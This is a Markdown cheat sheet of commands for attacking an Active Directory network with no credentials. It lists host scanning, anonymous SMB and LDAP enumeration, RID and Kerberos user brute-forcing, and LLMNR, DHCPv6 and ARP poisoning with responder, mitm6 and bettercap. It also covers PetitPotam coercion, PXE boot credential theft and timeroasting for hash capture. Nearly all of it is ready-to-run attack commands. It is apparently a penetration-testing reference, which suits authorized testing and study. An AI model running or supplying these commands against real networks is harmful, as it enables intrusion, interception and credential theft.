# No Credentials

## Scan network >>> Vulnerable host
- `nxc smb <ip_range>`
- `nmap -sP -p <ip>`
- `nmap -Pn -sV --top-ports 50 --open <ip>`
- `nmap -Pn --script smb-vuln* -p139,445 <ip>`
- `nmap -Pn -sC -sV -oA <output> <ip>`
- `nmap -Pn -sC -sV -p- -oA <output> <ip>`
- `nmap -sU -sC -sV -oA <output> <ip>`

## Find DC IP
- `nmcli dev show <interface>`
- `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>`
- `nmap -p 88 --open <ip_range>`

## Zone transfer
- `dig axfr <domain_name> @<name_server>`

## Anonymous & Guest access on SMB shares
- `nxc smb <ip_range> -u '' -p ''`
- `nxc smb <ip_range> -u 'a' -p ''`
- `enum4linux-ng.py -a -u '' -p '' <ip>`
- `smbclient -U '%' -L //<ip>`

## Enumerate LDAP >>> Username
- `nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>`
- `ldapsearch -x -H <dc_ip> -s base`

## Enumerate Users >>> Username
- `nxc smb <dc_ip> --users`
- `nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID`
- `net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%'`

## Bruteforce users >>> Username
- `kerbrute userenum -d <domain> <userlist>`
- `nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm= '<domain>',userdb=<user_list_file>" <dc_ip>`

## Poisoning >>> poisoning SMB || poisoning LDAP || poisoning HTTP
- LLMNR / NBTNS / MDNS
  - `responder -l <interface>`
- ⚠️ DHCPv6 (IPv6 prefered to IPv4)
  - `mitm6 -d <domain>`
  - `bettercap`
- ⚠️ ARP Poisoning
  - `bettercap`
  - `asreqroast`
    - `Pcredz -i <interface> -v` >>> Hash found ASREQ

## Coerce >>> Coerce SMB
- Unauthenticated PetitPotam (CVE-2022-26925) @CVE@
  - `petitpotam.py -d <domain> <listener> <target>`

## PXE
- no password >>> Credentials (NAA account)
  - `pxethief.py 1`
  - `pxethief.py 2 <distribution_point_ip>`
- password protected >>> PXE Hash
  - `tftp -i <dp_ip> GET "\xxx\boot.var"`
  - `pxethief.py 5 '\xxx\boot.var'`

## TimeRoasting >>> timeroast hash
- `timeroast.py <dc_ip> -o <output_log>`
